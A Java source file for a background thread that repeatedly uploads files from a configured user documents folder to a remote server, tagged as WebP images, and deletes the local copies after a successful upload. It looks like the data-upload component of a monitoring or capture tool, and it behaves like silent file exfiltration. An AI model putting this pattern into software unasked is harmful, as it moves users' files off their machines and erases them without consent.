import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.Arrays;
import java.util.ArrayList;
import java.util.List;
import java.util.Collections;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;


public class Sender extends Thread {
    String userDocumentsPath = Config.USER_DOCUMENTS_PATH;
    File folder;
    String key;
    Sender(String key) {
        folder = new File(userDocumentsPath);
        this.key = key;
    }

    private void getImagesPaths(ArrayList<String> paths) {
        File[] listOfFiles = folder.listFiles();
        Arrays.sort(listOfFiles);
        for (int i = 0; i < listOfFiles.length && i < Config.MAX_FILES_PER_UPLOAD; i++)
            paths.add(listOfFiles[i].getAbsolutePath());
    }

    private void uploadFiles(String remoteUrl, List<String> paths) throws IOException {
        HttpClient httpClient = HttpClients.createDefault();
        HttpPost httpPost = new HttpPost(remoteUrl + "?key=" + key);
        System.out.println(remoteUrl + "?key=" + key);

        MultipartEntityBuilder multipartEntityBuilder = MultipartEntityBuilder.create();

        int i = 0;
        int max = paths.size() - 2;
        for (String filePath : paths) {
            File file = new File(filePath);
            if (file.exists())
                multipartEntityBuilder.addBinaryBody("files[" + i + "]", file, ContentType.create("image/webp"), file.getName());
            i++;
            if (i == max)
                break;
        }
        HttpEntity httpEntity = multipartEntityBuilder.build();
        httpPost.setEntity(httpEntity);

        HttpResponse response = httpClient.execute(httpPost);

        int statusCode = response.getStatusLine().getStatusCode();
        if (statusCode == 200) {
            i = 0;
            for (String filePath : paths) {
                File file = new File(filePath);
                if (file.exists())
                    file.delete();
                i++;
                if (i == max)
                    break;
            }
            //System.out.println("HTTP Body: " + EntityUtils.toString(response.getEntity()));
        } else {
            //System.out.println("Failure");
            //System.out.println("HTTP Body: " + EntityUtils.toString(response.getEntity()));
        }

    }

    public void run() {
        ArrayList<String> paths = new ArrayList<String>();

        while(true) {
            getImagesPaths(paths);
            try {
                if (paths.size() > 2)
                    uploadFiles(Config.SERVER_URL, paths);
            } catch (Exception e) {
                System.out.println(e);
            }
            paths.clear();
            try {
                Thread.sleep(Config.INTERVAL_PER_UPLOAD_MS);
            } catch (Exception e) {
                System.out.println(e);
            }
        }
    }
} // end of class